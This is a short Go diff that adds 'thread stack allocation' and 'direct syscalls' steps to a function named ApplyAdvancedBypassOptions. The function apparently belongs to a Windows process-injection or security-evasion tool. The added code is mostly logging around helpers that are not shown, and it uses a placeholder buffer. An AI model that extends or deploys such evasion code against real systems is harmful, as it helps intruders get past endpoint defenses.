@@ -410,6 +410,37 @@ func ApplyAdvancedBypassOptions(hProcess windows.Handle, baseAddress uintptr, si
 		}
 	}
 
+	// Apply thread stack allocation if enabled
+	if options.ThreadStackAllocation {
+		Printf("Applying thread stack allocation...\n")
+		// This technique is typically used during memory allocation phase
+		// For existing allocations, we can try to allocate additional memory near thread stacks
+		stackAddr, err := AllocateBehindThreadStack(hProcess, size)
+		if err != nil {
+			Printf("Warning: Thread stack allocation failed: %v\n", err)
+			failedTechniques = append(failedTechniques, "Thread Stack Allocation")
+		} else {
+			Printf("Thread stack allocation applied successfully at 0x%X\n", stackAddr)
+			appliedTechniques = append(appliedTechniques, "Thread Stack Allocation")
+			// Note: In a real implementation, we might need to copy data to the new location
+		}
+	}
+
+	// Apply direct syscalls if enabled
+	if options.DirectSyscalls {
+		Printf("Applying direct syscalls...\n")
+		// Create a dummy buffer for testing direct syscalls
+		testBuffer := make([]byte, 1024)
+		err := DirectSyscalls(hProcess, baseAddress, testBuffer)
+		if err != nil {
+			Printf("Warning: Direct syscalls failed: %v\n", err)
+			failedTechniques = append(failedTechniques, "Direct Syscalls")
+		} else {
+			Printf("Direct syscalls applied successfully\n")
+			appliedTechniques = append(appliedTechniques, "Direct Syscalls")
+		}
+	}
+
 	Printf("Advanced bypass options application completed\n")
 	Printf("Successfully applied: %v\n", appliedTechniques)
 	if len(failedTechniques) > 0 {
